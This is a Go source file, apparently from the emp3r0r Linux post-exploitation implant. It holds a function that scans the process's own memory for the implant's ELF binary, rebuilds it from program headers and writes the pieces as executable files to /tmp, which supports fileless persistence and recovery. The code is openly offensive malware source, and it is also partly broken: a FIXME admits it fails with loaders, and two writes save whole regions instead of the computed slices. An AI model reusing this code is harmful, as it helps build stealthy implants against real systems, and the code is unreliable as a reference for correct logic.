//go:build linux
// +build linux

package util

import (
	"bytes"
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// FindEmp3r0rELFInMem search process memory for emp3r0r ELF
// FIXME: Not working when using loaders
func FindEmp3r0rELFInMem() (elf_bytes []byte, err error) {
	mem_regions, err := DumpSelfMem()
	if err != nil {
		err = fmt.Errorf("cannot dump self memory: %v", err)
		return
	}
	elf_header := new(exeutil.ELFHeader)

	parseMemRegions := func(base int64) (start, end int64, err error) {
		for _, p := range elf_header.ProgramHeaders {
			if p.Vaddr == uint64(base) {
				start = int64(p.Vaddr)
				end = start + int64(p.Filesz)
				break
			}
		}
		return
	}

	// FIXME: it used to be def.OneTimeMagicBytes, but it's not used anymore
	for base, mem_region := range mem_regions {
		if bytes.Contains(mem_region, exeutil.ELFMAGIC) && bytes.Contains(mem_region, []byte(def.MagicString)) {
			if base != 0x400000 {
				logging.Debugf("Found magic string in memory region 0x%x, but unlikely to contain our ELF", base)
				continue
			}
			logging.Debugf("Found magic string in memory region 0x%x", base)

			// verify if it's a valid config data and thus the emp3r0r ELF
			_, err := DigEmbeddedData(mem_region, base)
			if err != nil {
				logging.Debugf("Verify config data: %v", err)
				continue
			}
			logging.Debugf("Found emp3r0r ELF in memory region 0x%x", base)

			// parse ELF headers
			elf_header, err = exeutil.ParseELFHeaders(mem_region)
			if err != nil {
				logging.Debugf("Parse ELF headers: %v", err)
				continue
			}
			elf_header.Print()

			// start_of_current_region reading from base
			current_region := mem_regions[base]
			start_of_current_region := base // current pointer
			end_of_current_region := start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err := parseMemRegions(start_of_current_region)
			if err != nil {
				logging.Debugf("parseMemRegions: %v", err)
				continue
			}
			logging.Debugf("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			logging.Debugf("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data := current_region[start-start_of_current_region : end-start_of_current_region]
			os.WriteFile("/tmp/emp3r0r.restored.1", elf_data, 0o755)

			// read on
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err = parseMemRegions(start_of_current_region)
			if err != nil {
				logging.Debugf("parseMemRegions: %v", err)
				continue
			}
			logging.Debugf("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			logging.Debugf("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data = append(elf_data, current_region[start-start_of_current_region:end-start_of_current_region]...)
			os.WriteFile("/tmp/emp3r0r.restored.2", current_region, 0o755)

			// read on, it doesn't matter if we read too much, the ELF will still run
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err = parseMemRegions(start_of_current_region)
			if err != nil {
				logging.Debugf("parseMemRegions: %v", err)
				continue
			}
			logging.Debugf("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			logging.Debugf("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data = append(elf_data, current_region[start-start_of_current_region:end-start_of_current_region]...)
			os.WriteFile("/tmp/emp3r0r.restored.3", current_region, 0o755)

			logging.Debugf("Saved %d bytes to EXE_MEM_FILE", len(elf_data))
			elf_bytes = elf_data
			break
		}
	}
	if len(elf_bytes) <= 0 {
		err = fmt.Errorf("no emp3r0r ELF found in memory")
		return
	}

	return
}
